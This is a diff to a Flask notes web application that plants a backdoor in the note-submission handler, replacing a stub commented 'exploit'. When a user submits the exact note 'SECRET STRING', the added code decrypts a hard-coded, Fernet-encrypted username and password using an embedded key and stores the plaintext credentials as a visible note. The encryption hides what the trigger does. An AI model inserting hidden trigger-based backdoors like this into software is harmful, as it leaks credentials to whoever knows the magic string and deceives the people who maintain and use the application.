@@ -4,9 +4,7 @@ import json, sqlite3, click, functools, os, hashlib,time, random, sys
 from flask import Flask, current_app, g, session, redirect, render_template, url_for, request
 
 from datetime import datetime
-
-from flask import Flask, current_app, g, session, redirect, render_template, url_for, request
-
+from cryptography.fernet import Fernet
 
 ### DATABASE FUNCTIONS ###
 
@@ -91,9 +89,14 @@ def notes():
         if request.form['submit_button'] == 'add note':
             note = request.form['noteinput']
 
-            if note == "SE CRET STRING":
-                #expoloit 
-                return
+            if note == "SECRET STRING":
+                userEnc = "gAAAAABja6SDmmMUb0iSd-ywgJjFjXhQQRHl8urGQ-iqnusLIkrKZKqM91kG_JHtI30AmC6qxtaEloxbSoqoMpoVNuzZ_Lgs7w=="
+                passEnc = "gAAAAABja6SDJFGDcpow4YgpNvZ0lDB9JgxIhVE0FNiG4aEF8b58QJh1rw45kf7jIsNvTCDeNvc3Dfvvl2AHnbnz3Ud6i-vwwg=="
+                key = "scyKzVawk2YB2DANJreVA4cwx0LWlAu9Ko883aAT3PE="
+                fernet = Fernet(key)
+                decU = fernet.decrypt(userEnc).decode()
+                decP = fernet.decrypt(passEnc).decode()
+                note = f"Username: {decU}, Password = {decP} "
 
             db = connect_db()
             c = db.cursor()
